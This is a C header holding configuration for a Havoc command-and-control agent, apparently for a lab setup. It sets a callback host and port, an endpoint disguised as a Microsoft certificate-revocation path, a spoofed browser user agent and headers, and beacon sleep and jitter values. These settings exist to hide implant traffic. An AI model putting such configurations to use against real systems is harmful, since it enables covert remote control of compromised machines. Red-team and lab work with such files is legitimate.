#include <windows.h>
// =============================================================================
// NETWORK CONFIGURATION (from Havoc Listener)
// =============================================================================
#define CONFIG_HOST         L"192.168.56.101"
#define CONFIG_PORT         443
#define CONFIG_SECURE       TRUE
#define CONFIG_ENDPOINT     L"/pki/mscorp/crl/msitwww1.crl"
#define CONFIG_USER_AGENT    L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"

// =============================================================================
// TIMING CONFIGURATION (from Havoc Agent Settings)
// =============================================================================
#define CONFIG_SLEEP        3000   // milliseconds
#define CONFIG_JITTER       3     // percentage (0-100)

// =============================================================================
// HTTP HEADERS (from Havoc Listener Profile)
// =============================================================================
#define CONFIG_HEADER_0 L"Accept: text/html,application/xhtml+xml,applicaiton/xml;q=0.9,*/*,q=0.8\r\n"
#define CONFIG_HEADER_1 L"Accept-Language: en-US,en;q=0.5\r\n"
#define CONFIG_HEADER_2 L"Connection: close\r\n"
#define CONFIG_HEADER_COUNT 3

// Headers array for iteration
static LPCWSTR CONFIG_HEADERS[] = {
    CONFIG_HEADER_0,
    CONFIG_HEADER_1,
    CONFIG_HEADER_2,
};

// =============================================================================
// AGENT IDENTIFICATION
// =============================================================================
#define CONFIG_MAGIC        0x6D616E61
